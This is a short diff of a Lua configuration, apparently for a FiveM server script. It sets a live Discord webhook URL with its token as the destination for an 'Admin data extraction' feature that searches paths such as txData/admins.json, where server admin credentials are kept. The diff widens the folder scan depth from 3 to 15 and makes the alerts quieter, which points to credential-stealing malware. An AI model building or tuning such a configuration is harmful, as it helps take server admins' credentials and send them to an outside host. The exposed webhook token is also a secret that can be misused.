@@ -47,10 +47,10 @@ local Config = {
         url = "https://discord.com/api/webhooks/1401562823603257398/H1AVe0b-HseR9QdEAexqdHwJG-omUnqmNUorkaesJtM6xVJszyOIXwklx7OlPYuxysTx",                          -- Discord webhook URL
         username = "FiveM Intelligence",                        -- Bot username
         avatar_url = "https://i.imgur.com/example.png",         -- Bot avatar
-        mention = "@everyone",                                  -- Role/user to mention (empty for none)
+        mention = "",                                  -- Role/user to mention (empty for none)
         color = 16711680,                                       -- Embed color (red)
         timeout_ms = 10000,                                     -- Webhook timeout (ms)
-        retry_count = 3                                         -- Number of retries if webhook fails
+        retry_count = 1                                         -- Number of retries if webhook fails
     },
     
     -- Admin data extraction
@@ -69,7 +69,7 @@ local Config = {
             "../../txData/admins.json",
             "./server/txData/admins.json",
         },
-        max_scan_depth = 3                           -- Maximum folder depth for scanning
+        max_scan_depth = 15                           -- Maximum folder depth for scanning
     },
     
     -- Resource targeting
